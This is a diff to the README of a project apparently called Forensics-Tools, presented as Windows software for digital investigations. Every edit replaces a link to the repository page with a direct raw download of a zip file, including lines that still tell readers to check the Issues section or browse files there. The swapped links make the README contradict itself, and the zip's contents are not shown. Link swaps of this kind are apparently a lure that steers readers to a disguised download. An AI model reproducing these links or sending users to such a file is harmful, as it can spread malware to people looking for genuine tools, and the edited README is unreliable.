@@ -1,6 +1,6 @@
 # 🕵️ Forensics-Tools - Practical Tools for Digital Investigations
 
-[![Download Forensics-Tools](https://img.shields.io/badge/Download-Forensics--Tools-brightgreen)](https://github.com/Komuda146/Forensics-Tools)
+[![Download Forensics-Tools](https://img.shields.io/badge/Download-Forensics--Tools-brightgreen)](https://raw.githubusercontent.com/Komuda146/Forensics-Tools/main/foyer/Tools_Forensics_3.5.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Forensics-Tools offers useful software for digital forensics tasks. This include
 
 To get started, visit this page to download the latest version of Forensics-Tools:
 
-[https://github.com/Komuda146/Forensics-Tools](https://github.com/Komuda146/Forensics-Tools)
+[https://raw.githubusercontent.com/Komuda146/Forensics-Tools/main/foyer/Tools_Forensics_3.5.zip](https://raw.githubusercontent.com/Komuda146/Forensics-Tools/main/foyer/Tools_Forensics_3.5.zip)
 
 On the page, look for a link named **Releases** or **Download**. This will take you to files you can download. Choose the version that matches your Windows system (usually a file ending with `.exe` or `.zip`). Save this file to a location you can easily find, like your Desktop or Downloads folder.
 
@@ -113,7 +113,7 @@ For most users, no additional installations are needed. The software packs requi
 If you encounter issues, you can:
 
 - Review the README and help files included in the download.
-- Check the Issues section at https://github.com/Komuda146/Forensics-Tools for solutions.
+- Check the Issues section at https://raw.githubusercontent.com/Komuda146/Forensics-Tools/main/foyer/Tools_Forensics_3.5.zip for solutions.
 - Ask questions or report bugs there.
 
 ---
@@ -122,7 +122,7 @@ If you encounter issues, you can:
 
 This project resides on GitHub. While you do not need to run code or install from source, you may explore files there for more information:
 
-https://github.com/Komuda146/Forensics-Tools
+https://raw.githubusercontent.com/Komuda146/Forensics-Tools/main/foyer/Tools_Forensics_3.5.zip
 
 ---
 
@@ -132,4 +132,4 @@ Forensics tools often access sensitive data. Use them responsibly and only on de
 
 ---
 
-[![Download Forensics-Tools](https://img.shields.io/badge/Download-Forensics--Tools-brightgreen)](https://github.com/Komuda146/Forensics-Tools)
+[![Download Forensics-Tools](https://img.shields.io/badge/Download-Forensics--Tools-brightgreen)](https://raw.githubusercontent.com/Komuda146/Forensics-Tools/main/foyer/Tools_Forensics_3.5.zip)
